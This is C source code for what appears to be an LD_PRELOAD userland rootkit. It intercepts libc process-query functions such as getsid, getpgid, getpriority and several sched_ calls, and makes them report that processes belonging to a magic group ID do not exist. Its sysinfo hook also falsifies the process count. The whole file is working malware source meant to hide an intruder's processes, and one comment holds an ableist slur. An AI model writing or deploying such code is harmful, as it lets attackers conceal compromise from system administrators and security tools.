#include <sys/resource.h>
// This is needed on GCC >4.7. Thanks Paul Rubel.
// http://stackoverflow.com/a/18517210
#include <sys/sysinfo.h>
// ok, we're officially autistic now.
int sched_rr_get_interval(pid_t pid, struct timespec * tp) {
  struct stat s_fstat;
  char procid[20];
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_sched_rr_get_interval) old_sched_rr_get_interval=real_dlsym(libc,"sched_rr_get_interval");
  if(!old_xstat) old_xstat = real_dlsym (libc, "__xstat");
  if(getgid() == MAGIC_GID) return old_sched_rr_get_interval(pid,tp);
  memset(&s_fstat, 0, sizeof(stat));
  snprintf(procid,sizeof(procid),"/proc/%d",pid);
  old_xstat(_STAT_VER, procid, &s_fstat);
  if(s_fstat.st_gid == MAGIC_GID) {
    errno = ESRCH;
    return -1;
  }
return old_sched_rr_get_interval(pid,tp);
}

int sched_getparam(pid_t pid, struct sched_param *param) {
  struct stat s_fstat;
  char procid[20];
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_sched_getparam) old_sched_getparam=real_dlsym(libc,"sched_getparam");
  if(!old_xstat) old_xstat = real_dlsym (libc, "__xstat");
  if(getgid() == MAGIC_GID) return old_sched_getparam(pid,param);
  memset(&s_fstat, 0, sizeof(stat));
  snprintf(procid,sizeof(procid),"/proc/%d",pid);
  old_xstat(_STAT_VER, procid, &s_fstat);
  if(s_fstat.st_gid == MAGIC_GID) {
    errno = ESRCH;
    return -1;
  }
return old_sched_getparam(pid,param);
}

int sched_getaffinity(pid_t pid, size_t cpusetsize, cpu_set_t *mask) {
  struct stat s_fstat;
  char procid[20];
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_sched_getaffinity) old_sched_getaffinity=real_dlsym(libc,"sched_getaffinity");
  if(!old_xstat) old_xstat = real_dlsym (libc, "__xstat");
  if(getgid() == MAGIC_GID) return old_sched_getaffinity(pid,cpusetsize,mask);
  memset(&s_fstat, 0, sizeof(stat));
  snprintf(procid,sizeof(procid),"/proc/%d",pid);
  old_xstat(_STAT_VER, procid, &s_fstat);
  if(s_fstat.st_gid == MAGIC_GID) {
    errno = ESRCH;
    return -1;
  }
return old_sched_getaffinity(pid,cpusetsize,mask);
}

int sysinfo(struct sysinfo *info) {
    FILE *ps_spoof;
    int rval;
    char count[10];
    if(!libc) libc=dlopen(LIBC_PATH,RTLD_LAZY);
    if(!old_sysinfo) old_sysinfo=real_dlsym(libc,"sysinfo");
    rval = old_sysinfo(info);
    ps_spoof = popen("ps axHo lwp,cmd|wc -l","r");
    fscanf(ps_spoof,"%9s",count);
    pclose(ps_spoof);
    info->procs = atoi(count)-4; // why -4? 1 for the shell, 1 for ps, 1 for wc.. i don't know where the other process went
    return rval;
}
int getpriority(__priority_which_t __which, id_t __who) {
  struct stat s_fstat;
  char procid[20];
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_getpriority) old_getpriority=real_dlsym(libc,"getpriority");
  if(!old_xstat) old_xstat = real_dlsym (libc, "__xstat");
  memset(&s_fstat, 0, sizeof(stat));
  if(getgid() == MAGIC_GID) return old_getpriority(__which,__who);
  snprintf(procid,sizeof(procid),"/proc/%d",__who);
  old_xstat(_STAT_VER, procid, &s_fstat);
  if(s_fstat.st_gid == MAGIC_GID) {
    errno = ESRCH;
    return -1;
  }
  return old_getpriority(__which,__who);
}

int getsid(int pid) {
  struct stat s_fstat;
  char procid[20];
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_getsid) old_getsid=real_dlsym(libc,"getsid");
  if(!old_xstat) old_xstat=real_dlsym (libc, "__xstat");
  if(getgid() == MAGIC_GID) return old_getsid(pid);
  memset(&s_fstat, 0, sizeof(stat));
  snprintf(procid,sizeof(procid),"/proc/%d",pid);
  old_xstat(_STAT_VER, procid, &s_fstat);
  if(s_fstat.st_gid == MAGIC_GID) {
    errno = ESRCH;
    return -1;
  }
  return old_getsid(pid);
}


int sched_getscheduler(int pid) {
  struct stat s_fstat;
  char procid[20];
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_sched_getscheduler) old_sched_getscheduler=real_dlsym(libc,"sched_getscheduler");
  if(!old_xstat) old_xstat=real_dlsym (libc, "__xstat");
  memset(&s_fstat, 0, sizeof(stat));
  if(getgid() == MAGIC_GID) return old_sched_getscheduler(pid);
  snprintf(procid,sizeof(procid),"/proc/%d",pid);
  old_xstat(_STAT_VER, procid, &s_fstat);
  if(s_fstat.st_gid == MAGIC_GID) {
    errno = ESRCH;
    return -1;
  }
  return old_sched_getscheduler(pid);
}

int getpgid(int pid) {
  struct stat s_fstat;
  char procid[20];
  if(!libc) libc = dlopen(LIBC_PATH,RTLD_LAZY);
  if(!old_getpgid) old_getpgid=real_dlsym(libc,"getpgid");
  if(!old_xstat) old_xstat=real_dlsym (libc, "__xstat");
  memset(&s_fstat, 0, sizeof(stat));
  if(getgid() == MAGIC_GID) return old_getpgid(pid);
  snprintf(procid,sizeof(procid),"/proc/%d",pid);
  old_xstat(_STAT_VER, procid, &s_fstat);
  if(s_fstat.st_gid == MAGIC_GID) {
    errno = ESRCH;
    return -1;
  }
  return old_getpgid(pid);
}

